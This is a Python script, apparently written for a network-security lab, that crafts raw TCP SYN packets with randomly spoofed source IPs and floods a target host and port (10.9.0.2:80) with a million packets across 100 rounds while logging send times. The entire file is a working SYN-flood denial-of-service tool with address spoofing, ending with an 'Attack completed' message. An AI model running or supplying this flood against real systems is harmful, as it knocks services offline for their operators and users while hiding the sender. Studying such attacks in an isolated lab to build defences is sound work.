import socket
import struct
import random
import time


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i + 1]
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


def create_ip_header(src_ip, dst_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20  # IP header + TCP header
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    return ip_header


def create_tcp_header(src_port, dst_port, seq):
    tcp_source = src_port
    tcp_dest = dst_port
    tcp_seq = seq
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH',
                             tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    return tcp_header


def syn_flood(target_ip, target_port, num_packets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as e:
        print(f"Error creating socket: {e}")
        return

    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    try:
        log_file = open("syns_results_p.txt", "w")
    except IOError as e:
        print(f"Error opening file: {e}")
        return

    for i in range(num_packets):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)

        ip_header = create_ip_header(src_ip, target_ip)
        tcp_header = create_tcp_header(src_port, target_port, random.randint(0, 4294967295))

        packet = ip_header + tcp_header

        start_time = time.time()
        s.sendto(packet, (target_ip, 0))
        end_time = time.time()

        send_time = end_time - start_time
        log_file.write(f"{i + 1} {send_time:.9f}\n")
        log_file.flush()

    log_file.close()
    s.close()


if __name__ == "__main__":
    TARGET_IP = "10.9.0.2"
    TARGET_PORT = 80
    NUM_PACKETS = 10000
    NUM_ITERATIONS = 100

    start_time = time.time()

    for i in range(NUM_ITERATIONS):
        syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS)

    end_time = time.time()
    total_time = end_time - start_time

    try:
        with open("syns_results_p.txt", "a") as log_file:
            log_file.write(f"Total packets sent: {NUM_PACKETS * NUM_ITERATIONS}\n")
            log_file.write(f"Total time taken: {total_time:.9f} seconds\n")
            log_file.write(f"Average time per packet: {total_time / (NUM_PACKETS * NUM_ITERATIONS):.9f} seconds\n")
    except IOError as e:
        print(f"Error opening file: {e}")

    print("Attack completed. Results logged to syns_results_p.txt")